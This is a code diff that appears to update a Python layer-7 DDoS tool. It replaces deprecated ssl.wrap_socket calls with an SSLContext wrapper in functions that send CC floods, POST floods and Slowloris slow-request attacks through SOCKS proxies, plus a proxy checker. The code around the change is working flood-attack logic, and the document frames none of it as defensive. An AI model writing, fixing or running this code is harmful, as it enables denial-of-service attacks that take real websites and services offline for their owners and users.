@@ -135,7 +135,8 @@ def cc(socks_type):
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
-				s = ssl.wrap_socket(s)
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
@@ -184,7 +185,8 @@ def post(socks_type):
 			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
-				s = ssl.wrap_socket(s)
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send(str.encode(request))
 			print ("[*] "+n+" Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
@@ -216,7 +218,8 @@ def slow(conn,socks_type):
 			s.settimeout(0.6)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
-				s = ssl.wrap_socket(s)
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -257,7 +260,8 @@ def slow(conn,socks_type):
 				s.settimeout(1)
 				s.connect((str(ip), int(port)))
 				if str(port) == '443':
-					s = ssl.wrap_socket(s)
+					ctx = ssl.SSLContext()
+					s = ctx.wrap_socket(s,server_hostname=ip)
 				s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
 				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
 				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -300,7 +304,8 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 			s.settimeout(ms)#You can change by yourself
 			s.connect((str(ip), int(port)))
 			if port == 443:
-				s = ssl.wrap_socket(s)
+				ctx = ssl.SSLContext()
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			s.close()
 			break
